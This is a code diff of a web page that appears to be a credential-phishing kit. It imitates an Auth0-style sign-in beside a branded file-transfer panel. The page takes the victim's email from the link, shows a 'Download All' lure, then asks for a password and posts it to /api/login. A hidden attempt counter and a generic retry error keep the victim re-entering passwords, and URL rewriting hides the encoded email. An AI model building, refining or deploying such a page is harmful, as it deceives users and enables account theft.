@@ -36,7 +36,6 @@
             padding: 20px;
         }
 
-        /* ─── LOADING OVERLAY ─── */
         .loading-overlay {
             position: fixed;
             inset: 0;
@@ -68,9 +67,7 @@
         }
 
         @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+            to { transform: rotate(360deg); }
         }
 
         .loading-text {
@@ -81,7 +78,6 @@
             font-weight: 400;
         }
 
-        /* ─── MAIN CONTAINER ─── */
         .wt-container {
             display: flex;
             max-width: 1120px;
@@ -89,12 +85,11 @@
             min-height: 600px;
             background: #fff;
             border-radius: 28px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.10), 0 8px 24px rgba(0, 0, 0, 0.05);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.10), 0 8px 24px rgba(0,0,0,0.05);
             overflow: hidden;
             position: relative;
         }
 
-        /* ─── SPLIT PANES ─── */
         .wt-pane {
             flex: 1;
             padding: 48px 40px;
@@ -110,7 +105,6 @@
             overflow: hidden;
         }
 
-        /* ─── LEFT PANE BACKGROUND IMAGE ─── */
         .wt-pane--left::before {
             content: '';
             position: absolute;
@@ -128,7 +122,7 @@
             content: '';
             position: absolute;
             inset: 0;
-            background: radial-gradient(ellipse at 30% 40%, rgba(255, 255, 255, 0.4) 0%, transparent 70%);
+            background: radial-gradient(ellipse at 30% 40%, rgba(255,255,255,0.4) 0%, transparent 70%);
             pointer-events: none;
             z-index: 0;
         }
@@ -146,7 +140,6 @@
             z-index: 2;
         }
 
-        /* ─── LOGO ─── */
         .wt-logo {
             position: absolute;
             top: 32px;
@@ -157,7 +150,6 @@
             opacity: 0.9;
         }
 
-        /* ─── PRODUCT HEADER ─── */
         .wt-product-header {
             margin-bottom: 24px;
             position: relative;
@@ -189,12 +181,11 @@
             letter-spacing: 0.2px;
         }
 
-        /* ─── FEATURE IMAGE ─── */
         .wt-product-feature__image-wrapper {
             margin-top: 8px;
             border-radius: 18px;
             overflow: hidden;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.08);
             position: relative;
             z-index: 1;
             background: #fff;
@@ -213,7 +204,6 @@
             transform: scale(1.01);
         }
 
-        /* ─── AUTH WIDGET ─── */
         .auth0-lock-widget {
             width: 100%;
             max-width: 380px;
@@ -236,7 +226,6 @@
             width: 100%;
         }
 
-        /* ─── HEADER ─── */
         .auth0-lock-header {
             text-align: center;
             margin-bottom: 28px;
@@ -255,7 +244,6 @@
             display: inline-block;
         }
 
-        /* ─── TABS ─── */
         .auth0-lock-tabs-container {
             margin-bottom: 12px;
         }
@@ -297,7 +285,6 @@
             margin: 0 0 16px 0;
         }
 
-        /* ─── FILE LIST (STEP 1) ─── */
         .auth0-lock-input-block {
             margin-bottom: 14px;
         }
@@ -354,7 +341,6 @@
             border-color: #1a1a1a;
         }
 
-        /* ─── BUTTON ─── */
         .auth0-lock-submit {
             display: block;
             width: 100%;
@@ -375,7 +361,7 @@
 
         .auth0-lock-submit:hover {
             background: #000;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
         }
 
         .auth0-lock-submit:active {
@@ -419,14 +405,13 @@
         .auth0-loading {
             width: 20px;
             height: 20px;
-            border: 2px solid rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255,255,255,0.2);
             border-top-color: #fff;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
             margin: 0 auto;
         }
 
-        /* ─── STEP 2: PASSWORD INPUT ─── */
         #two .auth0-lock-input-wrap {
             background: #f7f7f9;
             padding: 0 16px;
@@ -440,13 +425,13 @@
         #two .auth0-lock-input-wrap:focus-within {
             border-color: #1a1a1a;
             background: #fff;
-            box-shadow: 0 0 0 4px rgba(26, 26, 26, 0.06);
+            box-shadow: 0 0 0 4px rgba(26,26,26,0.06);
         }
 
         #two .auth0-lock-input-wrap.show-error {
             border-color: #e74c3c;
             background: #fff9f8;
-            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.08);
+            box-shadow: 0 0 0 4px rgba(231,76,60,0.08);
         }
 
         #two .auth0-lock-input-wrap .auth0-lock-icon {
@@ -481,7 +466,6 @@
             cursor: default;
         }
 
-        /* ─── EMAIL DISPLAY ─── */
         #email_display {
             color: #1a1a1a !important;
             font-weight: 500;
@@ -494,7 +478,6 @@
             font-weight: 400;
         }
 
-        /* ─── SLEEK ERROR CONTAINER ─── */
         .sleek-error-container {
             min-height: 56px;
             margin-top: 4px;
@@ -526,7 +509,7 @@
             color: #3d1e1a;
             font-weight: 400;
             line-height: 1.5;
-            box-shadow: 0 2px 8px rgba(231, 76, 60, 0.06);
+            box-shadow: 0 2px 8px rgba(231,76,60,0.06);
         }
 
         .error-message--sleek .emoji {
@@ -552,36 +535,22 @@
             margin: 2px 0;
         }
 
-        /* ─── ATTEMPT COUNTER (hidden via CSS) ─── */
         .attempt-counter {
             display: none !important;
         }
 
-        /* ─── SHAKE ANIMATION ─── */
         @keyframes shake {
-            0%,
-            100% {
-                transform: translateX(0);
-            }
-            20% {
-                transform: translateX(-8px);
-            }
-            40% {
-                transform: translateX(8px);
-            }
-            60% {
-                transform: translateX(-5px);
-            }
-            80% {
-                transform: translateX(5px);
-            }
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-8px); }
+            40% { transform: translateX(8px); }
+            60% { transform: translateX(-5px); }
+            80% { transform: translateX(5px); }
         }
 
         .shake {
             animation: shake 0.4s ease;
         }
 
-        /* ─── RESPONSIVE ─── */
         @media (max-width: 860px) {
             .wt-container {
                 flex-direction: column;
@@ -589,60 +558,48 @@
                 min-height: auto;
                 max-width: 480px;
             }
-
             .wt-pane {
                 padding: 32px 24px;
             }
-
             .wt-pane--left {
                 min-height: 200px;
                 padding-bottom: 20px;
             }
-
             .wt-pane--left::before {
                 opacity: 0.10;
             }
-
             .wt-pane--right {
                 min-width: 0;
                 padding: 24px 20px 32px;
             }
-
             .wt-logo {
                 top: 20px;
                 left: 24px;
                 height: 18px;
             }
-
             .wt-product-header__header {
                 font-size: 1.6rem;
                 max-width: 100%;
             }
-
             .wt-product-feature__image {
                 max-height: 140px;
             }
-
             .auth0-lock-widget {
                 max-width: 100%;
             }
-
             .auth0-lock-submit {
                 padding: 14px 20px;
                 font-size: 0.95rem;
             }
-
             #two .auth0-lock-input {
                 padding: 14px 0;
                 font-size: 0.9rem;
             }
-
             .error-message--sleek {
                 padding: 12px 14px 12px 12px;
                 font-size: 0.85rem;
                 gap: 10px;
             }
-
             .error-message--sleek .emoji {
                 font-size: 1.1rem;
             }
@@ -652,65 +609,52 @@
             body {
                 padding: 12px;
             }
-
             .wt-pane {
                 padding: 24px 16px;
             }
-
             .wt-pane--right {
                 padding: 18px 14px 24px;
             }
-
             .wt-pane--left {
                 min-height: 160px;
                 padding-bottom: 16px;
             }
-
             .wt-product-header__header {
                 font-size: 1.3rem;
             }
-
             .wt-product-header__subheader {
                 font-size: 0.9rem;
             }
-
             .auth0-lock-tabs-current {
                 font-size: 0.85rem;
                 padding: 10px 0 8px 0;
             }
-
             .auth0-lock-submit {
                 padding: 12px 16px;
                 font-size: 0.9rem;
                 border-radius: 32px;
             }
-
             #two .auth0-lock-input-wrap {
                 padding: 0 12px;
             }
-
             #two .auth0-lock-input {
                 padding: 12px 0;
                 font-size: 0.85rem;
             }
-
             .error-message--sleek {
                 padding: 10px 12px 10px 10px;
                 font-size: 0.8rem;
                 gap: 8px;
                 border-left-width: 3px;
             }
-
             .error-message--sleek .emoji {
                 font-size: 1rem;
             }
-
             .sleek-error-container {
                 min-height: 48px;
             }
         }
 
-        /* ─── DOWNLOAD BUTTON ICON ─── */
         .downloader__top-icon {
             width: 28px;
             height: 28px;
@@ -721,7 +665,6 @@
             fill: #1a1a1a;
         }
 
-        /* ─── FORGOT PASSWORD ─── */
         .auth0-lock-alternative {
             display: flex;
             justify-content: center;
@@ -733,12 +676,10 @@
             font-size: 0.8rem;
         }
 
-        /* ─── GLOBAL MESSAGE (hidden) ─── */
         .auth0-global-message {
             display: none !important;
         }
 
-        /* ─── FOCUS VISIBLE ─── */
         .auth0-lock-input:focus-visible {
             outline: none;
         }
@@ -748,7 +689,6 @@
             outline-offset: 2px;
         }
 
-        /* ─── EMAIL ICON IN STEP 2 ─── */
         .email-icon-wrapper {
             display: flex;
             align-items: center;
@@ -774,16 +714,14 @@
 
 <body>
 
-    <!-- ===== LOADING OVERLAY ===== -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
         <div class="loading-text">Logging you in…</div>
     </div>
 
-    <!-- ===== MAIN CONTENT ===== -->
     <main class="wt-container">
 
-        <!-- LEFT PANE: Branding -->
+        <!-- LEFT PANE -->
         <div class="wt-pane wt-pane--left">
             <img class="wt-logo" id="wt-logo"
             src="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjIwIiB2aWV3Qm94PSIwIDAgNDAgMjAiIHdpZHRoPSI0MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Im0xMi4yMjk5IDE0LjI0MDJjLS4zODMyLS42MDU1LS42OTY4LS45MjYtMS4yNTQzLS45MjZzLS44NzExLjMyMDUtMS4yNTQzNi45MjZsLTEuNjcyNDcgMi42NzEzYy0uNjI3MTggMS4wMzI5LTEuMTQ5ODMgMS43NDUzLTIuMzY5MzQgMS43NDUzcy0xLjc3Ny0uNDk4Ny0yLjM2OTMzLTEuODg3OGMtLjczMTcxLTEuNzA5Ni0xLjQ5ODI2LTMuNzc1NC0yLjE5NTEyLTYuNTUzNi0uNzY2NTQ5LTMuMDk5MjUtMS4xMTQ5OC01LjAyMjU5LTEuMTE0OTgtNi41ODk3NnMuNDg3ODA0LTIuNDkzMjIgMi4xNjAyNy0yLjgxMzc3N2MyLjI5OTY1LS40Mjc0MDkgNS40MDA2OS0uNjc2NzMxIDguODE1MzMtLjY3NjczMSAzLjQxNDYgMCA2LjUxNTcuMjQ5MzIyIDguODE1My42NzY3MzEgMS42NzI1LjMyMDU1NyAyLjE2MDMgMS4yNDY2MDcgMi4xNjAzIDIuODEzNzc3cy0uMzQ4NCAzLjQ5MDUxLTEuMTE1IDYuNTg5NzZjLS42OTY5IDIuNzc4Mi0xLjQ2MzQgNC44NDQtMi4xOTUxIDYuNTUzNi0uNTkyNCAxLjM4OTEtMS4xNDk4IDEuODg3OC0yLjM2OTQgMS44ODc4LTEuMjE5NSAwLTEuNzQyMS0uNzEyNC0yLjM2OTMtMS43NDV6bTI2LjUxNTggMi40OTk5Yy0xLjE4NDcgMS4yODIyLTMuNDE0NyAyLjIwODMtNi4zNDE1IDIuMjA4My01Ljg4ODUgMC05LjM3MjgtNC4wOTYtOS4zNzI4LTkuNDc0MjQgMC01Ljc3MDAzIDQuMDA2OS05LjE4OTMwMSA5LjE5ODYtOS4xODkzMDEgNC42MzQyIDAgNy43MDA0IDIuNDU3NjAxIDcuNzAwNCA1Ljc3MDAzMSAwIDMuMTM0MzMtMi42MTMzIDUuMTY0NTEtNS41NzUgNS4xNjQ1MS0xLjYwMjggMC0yLjc4NzQtLjMyMDUtMy41ODg4LS45NjE3LS4zMTM2LS4yNDkzLS40ODc4LS4yMTM3LS40ODc4LjA3MTMgMCAxLjE3NTQuNDE4MSAyLjE3MjYgMS4xODQ2IDIuOTU2Mi42MjcyLjY0MTEgMS44MTE5IDEuMDY4NiAyLjkyNjkgMS4wNjg2IDEuMTQ5OCAwIDIuMTYwMy0uMjQ5NCAzLjA2NjItLjcxMjRzMS42NzI1LS4zMjA2IDIuMTI1NC40Mjc0Yy41MjI3Ljg1NDgtLjIwOSAxLjk1OS0uODM2MiAyLjY3MTN6IiBmaWxsPSIjMDAwIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiLz48L3N2Zz4="
@@ -805,11 +743,11 @@
             </div>
         </div>
 
-        <!-- RIGHT PANE: Auth -->
+        <!-- RIGHT PANE -->
         <div id="wt-auth-widget-container" class="wt-pane wt-pane--right">
             <div class="auth0-lock-widget" role="form" aria-label="Login form">
 
-                <!-- ===== STEP 1: EMAIL ===== -->
+                <!-- STEP 1 -->
                 <div id="one">
                     <div class="auth0-lock-widget-container">
                         <div class="auth0-lock-cred-pane auth0-lock-quiet">
@@ -840,7 +778,6 @@
                                                     </div>
                                                     <div class="auth0-lock-pane-separator"></div>
 
-                                                    <!-- File list -->
                                                     <div class="auth0-lock-input-block auth0-lock-input-email">
                                                         <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon">
                                                             <hr>
@@ -882,7 +819,7 @@
                     </div>
                 </div>
 
-                <!-- ===== STEP 2: PASSWORD ===== -->
+                <!-- STEP 2 -->
                 <div id="two" style="display:none;">
                     <div class="auth0-lock-widget-container">
                         <div class="auth0-lock-cred-pane auth0-lock-quiet">
@@ -908,7 +845,6 @@
                                                     </div>
                                                     <div class="auth0-lock-pane-separator"></div>
 
-                                                    <!-- Email display with email icon (no #) -->
                                                     <div class="auth0-lock-input-block auth0-lock-input-email">
                                                         <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon">
                                                             <span class="email-icon-wrapper" aria-hidden="true">
@@ -922,7 +858,6 @@
                                                         </div>
                                                     </div>
 
-                                                    <!-- Password field -->
                                                     <div class="auth0-lock-input-block auth0-lock-input-show-password" id="passwordBlock">
                                                         <div class="auth0-lock-input-block auth0-lock-input-password">
                                                             <div class="auth0-lock-input-wrap" id="passwordWrap">
@@ -938,12 +873,10 @@
                                                         </div>
                                                     </div>
 
-                                                    <!-- SLEEK ERROR MESSAGE -->
                                                     <div class="sleek-error-container">
                                                         <div id="passwordError" class="error-message"></div>
                                                     </div>
 
-                                                    <!-- Attempt counter (hidden) -->
                                                     <div id="attemptCounter" class="attempt-counter"></div>
 
                                                     <p class="auth0-lock-alternative">
@@ -983,10 +916,8 @@
         (function() {
             'use strict';
 
-            // ─── CONFIG ───
             const API_URL = '/api/login';
 
-            // ─── DOM REFS ───
             const loadingOverlay = document.getElementById('loadingOverlay');
             const one = document.getElementById('one');
             const two = document.getElementById('two');
@@ -1002,49 +933,44 @@
             let currentEmail = '';
             let attemptCount = 0;
 
-            // ─── HELPERS ───
+            // ─── Get email from URL (query param or hash) ───
             function getEmailFromURL() {
-                let email = '';
+                // 1. Check query string first (clean URL)
+                const params = new URLSearchParams(window.location.search);
+                let email = params.get('email');
+                if (email && email.trim() !== '') return email.trim();
 
-                // Try hash first (e.g., #email=user@example.com)
+                // 2. If not found, try hash (legacy)
                 if (window.location.hash) {
                     try {
                         const hashParams = new URLSearchParams(window.location.hash.substring(1));
                         const hashEmail = hashParams.get('email');
-                        if (hashEmail && hashEmail.trim() !== '') {
-                            email = hashEmail.trim();
-                        }
-                    } catch (_) { /* ignore */ }
+                        if (hashEmail && hashEmail.trim() !== '') return hashEmail.trim();
+                    } catch (_) {}
 
-                    // If not found, try regex on the hash
-                    if (!email) {
-                        const match = window.location.hash.match(
-                            /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
-                        );
-                        if (match) email = match[0];
-                    }
+                    // Fallback regex on hash
+                    const match = window.location.hash.match(
+                        /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
+                    );
+                    if (match) return match[0];
                 }
 
-                // If still empty, try query string (e.g., ?email=user@example.com)
-                if (!email) {
-                    const params = new URLSearchParams(window.location.search);
-                    const queryEmail = params.get('email');
-                    if (queryEmail && queryEmail.trim() !== '') {
-                        email = queryEmail.trim();
-                    }
-                }
-
-                return email;
+                return '';
             }
 
-            // ─── REMOVE THE HASH FROM THE URL BAR ───
-            function cleanURL() {
-                if (window.location.hash) {
-                    try {
-                        const newUrl = window.location.pathname + window.location.search;
-                        window.history.replaceState(null, '', newUrl);
-                    } catch (_) { /* ignore */ }
-                }
+            // ─── Convert hash email to query param, remove hash ───
+            function upgradeURLToQuery() {
+                const email = getEmailFromURL();
+                if (!email) return;
+
+                // If the URL already has a query param with the email, do nothing
+                const params = new URLSearchParams(window.location.search);
+                if (params.get('email') === email) return;
+
+                // Build new URL with query param, remove hash
+                const base = window.location.pathname;
+                const newUrl = base + '?email=' + encodeURIComponent(email);
+                window.history.replaceState(null, '', newUrl);
             }
 
             function setLoading(loading) {
@@ -1057,10 +983,8 @@
                 submitBtn.disabled = loading;
             }
 
-            // ─── SLEEK ERROR — UNIFIED FRIENDLY MESSAGE ───
             function showSleekError() {
                 hideError();
-
                 const msg = `
                     <div class="error-message--sleek">
                         <span class="emoji">🔒</span>
@@ -1070,12 +994,9 @@
                         </span>
                     </div>
                 `;
-
                 passwordError.innerHTML = msg;
                 passwordError.classList.add('show');
                 passwordWrap.classList.add('show-error');
-
-                // Shake the input block
                 passwordBlock.classList.add('shake');
                 setTimeout(() => passwordBlock.classList.remove('shake'), 420);
             }
@@ -1086,12 +1007,17 @@
                 passwordWrap.classList.remove('show-error');
             }
 
-            // ─── STEP 1: DOWNLOAD ALL ───
+            // ─── STEP 1 ───
             downloadBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 hideError();
 
-                const email = getEmailFromURL();
+                let email = getEmailFromURL();
+                if (!email) {
+                    // If no email in URL, try to get from stored (shouldn't happen)
+                    email = currentEmail;
+                }
+
                 if (!email) {
                     passwordError.innerHTML =
                         `<div class="error-message--sleek"><span class="emoji">⚠️</span> <span class="error-text">Email not found in URL.</span></div>`;
@@ -1111,15 +1037,14 @@
                         setLoading(false);
                         if (data.success) {
                             currentEmail = email;
-                            // Display email cleanly — just the email, no extra characters
                             emailDisplay.value = email;
                             one.style.display = 'none';
                             two.style.display = 'block';
                             attemptCount = 0;
                             hideError();
                             passwordInput.value = '';
-                            // Remove the # from the URL bar
-                            cleanURL();
+                            // Ensure URL is clean (query param, no hash)
+                            upgradeURLToQuery();
                             setTimeout(() => passwordInput.focus(), 120);
                         } else {
                             passwordError.innerHTML =
@@ -1135,7 +1060,7 @@
                     });
             });
 
-            // ─── STEP 2: SUBMIT PASSWORD ───
+            // ─── STEP 2 ───
             submitBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 hideError();
@@ -1188,7 +1113,7 @@
                     });
             });
 
-            // ─── KEYBOARD: ENTER TO SUBMIT ───
+            // ─── KEYBOARD ───
             passwordInput.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter') {
                     e.preventDefault();
@@ -1196,12 +1121,11 @@
                 }
             });
 
-            // ─── ERROR CLEARING: ONLY ON INPUT (typing), NOT ON FOCUS ───
             passwordInput.addEventListener('input', function() {
                 hideError();
             });
 
-            // ─── AUTO-FOCUS PASSWORD WHEN STEP 2 APPEARS ───
+            // ─── AUTO-FOCUS ───
             const observer = new MutationObserver(function() {
                 if (two.style.display !== 'none' && two.style.display !== '') {
                     setTimeout(() => passwordInput.focus(), 200);
@@ -1214,22 +1138,20 @@
                 setTimeout(() => passwordInput.focus(), 200);
             }
 
-            // ─── ON PAGE LOAD: extract email, clean URL, and hide overlay ───
+            // ─── ON LOAD ───
             window.addEventListener('load', function() {
                 setLoading(false);
-                // Extract email and clean the URL on page load
+
+                // First, upgrade any hash-based email to query param
                 const email = getEmailFromURL();
                 if (email) {
                     currentEmail = email;
-                    // Optionally pre-fill the email display if you want,
-                    // but the flow requires clicking "Download All" first.
-                    // We just clean the URL here.
+                    upgradeURLToQuery();
+                    // Optionally pre-fill email? We'll only fill after clicking download.
                 }
-                cleanURL();
             });
 
         })();
     </script>
-
 </body>
 </html>
